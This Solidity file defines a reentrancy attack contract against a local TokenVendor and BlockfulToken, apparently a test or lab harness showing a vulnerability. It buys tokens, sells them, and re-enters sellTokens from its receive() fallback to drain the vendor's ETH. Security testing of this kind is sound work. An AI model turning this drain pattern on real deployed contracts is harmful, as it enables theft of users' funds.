// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TokenVendor.sol";
import "./BlockfulToken.sol";

contract ReentrancyAttack {
    TokenVendor public vendor;
    BlockfulToken public token;
    uint public counter;

    constructor(address _vendor, address _token) {
        vendor = TokenVendor(_vendor);
        token = BlockfulToken(_token);
    }

    receive() external payable {
        bool iHaveTokens = counter >= 1e18;
        bool vendorHasEth = address(vendor).balance >= 1e18;

        if (vendorHasEth && iHaveTokens) {
            counter -= 1e18;
            vendor.sellTokens(1e18); // Adjust the amount to sell based on the counter
        }
    }

    function run() external payable {
        // Buy tokens from the TokenVendor with 10 ETH
        vendor.buyTokens{value: 10 ether}();

        // Get the balance of tokens this contract has
        counter = token.balanceOf(address(this));

        // Approve the TokenVendor to spend tokens on behalf of this contract
        token.approve(address(vendor), 10 * 1e18);

        // Attempt to sell tokens, which will trigger the reentrancy attack
        vendor.sellTokens(1e18);
    }
}
